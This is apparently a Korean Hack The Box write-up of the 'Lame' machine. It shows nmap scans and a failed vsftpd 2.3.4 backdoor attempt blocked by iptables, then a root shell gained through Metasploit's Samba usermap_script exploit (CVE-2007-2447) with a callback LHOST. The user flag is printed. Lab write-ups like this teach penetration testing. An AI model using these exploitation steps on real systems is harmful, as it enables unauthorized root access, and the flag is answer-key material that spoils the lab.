# HTB — Lame

**OS:** Linux (Debian) **Difficulty:** Easy **IP:** 10.129.192.221 **Tags:** `samba` `CVE-2007-2447` `vsftpd-backdoor` `iptables` `metasploit`

---

## Summary

Lame은 HTB에서 가장 오래된 머신 중 하나로, Samba 3.0.20의 username map script 취약점(CVE-2007-2447)을 이용해 바로 root shell을 획득하는 머신이다. vsftpd 2.3.4 백도어도 존재하지만 iptables 방화벽으로 인해 실제로는 동작하지 않는다는 점이 흥미로운 학습 포인트다.

---

## Reconnaissance

### Port Scan (Top 1000)

```bash
nmap 10.129.192.221
```

```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

> ⚠️ `-p-` 전체 스캔 시 3632 (distccd)도 나오지만, Guided Mode의 "top 1000 ports" 기준으로는 **4개**

### Version Scan

```bash
nmap -p 21,22,139,445 -sV 10.129.192.221
```

주요 서비스:

- **vsftpd 2.3.4** — 유명한 backdoor 버전
- **Samba 3.0.20** — CVE-2007-2447 취약 버전

---

## VSFTPd 2.3.4 Backdoor (실패)

### 시도

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.129.192.221
run
```

**결과: 실패** — exploit이 동작하지 않음.

### 실패 원인 분석

root shell 획득 후 `netstat -tnlp`로 확인하면 실제로 많은 포트가 listening 중임을 알 수 있다.

```bash
netstat -tnlp
iptables -L
```

- vsftpd 백도어는 트리거되면 **포트 6200**에 shell을 열어둠
- 실제로 백도어 트리거 후 `netstat -tnlp | grep 6200` 확인하면 6200이 **listening 상태**임
- 하지만 **iptables 방화벽**이 외부에서 6200 포트로의 접근을 차단하고 있어서 Kali에서 연결 불가
- 즉, 백도어 자체는 작동하지만 방화벽이 막고 있는 것

> 💡 **교훈**: exploit 실패 시 방화벽 규칙을 확인하라. `netstat`으로 포트가 열렸는지, `iptables`로 차단 여부를 체크해야 한다.

---

## Exploitation — Samba CVE-2007-2447

### 취약점 설명

Samba 3.0.0 ~ 3.0.25rc3에서 `smb.conf`의 `username map script` 옵션이 활성화된 경우, username 필드에 shell metacharacter(`/bin/sh -c`)를 삽입해 임의 명령어 실행이 가능하다. SamrChangePassword 함수를 통해 인증 없이 RCE가 가능하며, Samba 프로세스가 root로 실행되므로 즉시 root shell을 획득할 수 있다.

### Metasploit

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.192.221
set LHOST 10.10.17.240
run
```

**root shell 즉시 획득** — `whoami` → `root`

---

## User Flag

```bash
cat /home/makis/user.txt
# cebabb51f492dd8b0658e8da4ad1d738
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Attack Chain

```
Port Scan (top 1000)
  → vsftpd 2.3.4 백도어 시도 → 실패 (iptables 차단)
  → Samba 3.0.20 발견
    → CVE-2007-2447 (usermap_script)
      → Metasploit → root shell 즉시 획득
```

---

## 심화: VSFTPd 실패 원인 분석

```bash
# root shell에서
netstat -tnlp        # 실제 listening 포트 확인
iptables -L          # 방화벽 규칙 확인
netstat -tnlp | grep 6200  # 백도어 트리거 후 확인
```

- `netstat`으로 보면 외부에서 보이지 않는 포트들이 실제로 많이 열려 있음
- iptables INPUT chain이 6200을 포함한 다수 포트를 DROP
- vsftpd 백도어는 정상 트리거 → 6200 listening 확인 → 그러나 외부 연결 차단
- nmap top 1000 스캔에서 4개만 보인 이유도 iptables 때문

> 자세한 분석은 [0xdf의 writeup](https://0xdf.gitlab.io/2020/04/07/htb-lame.html) 참고

---

## Key Takeaways

- **Samba usermap_script (CVE-2007-2447)**: `username map script` 설정이 활성화된 경우 username에 shell metacharacter 삽입으로 인증 없이 RCE 가능. Samba가 root로 실행 중이면 즉시 root.
- **VSFTPd 2.3.4 백도어**: 트리거 시 6200 포트에 shell이 열리지만, 방화벽이 차단하면 외부에서 접근 불가. exploit 실패 시 단순히 "패치됨"으로 결론 내리지 말고 방화벽 규칙을 확인해야 한다.
- **iptables**: `netstat -tnlp`와 nmap 결과가 다를 때는 방화벽을 의심하라.
- **nmap top 1000 vs -p-**: 기본 스캔과 전체 포트 스캔 결과가 다를 수 있음. 실전에서는 항상 `-p-`로 전체 스캔 필요.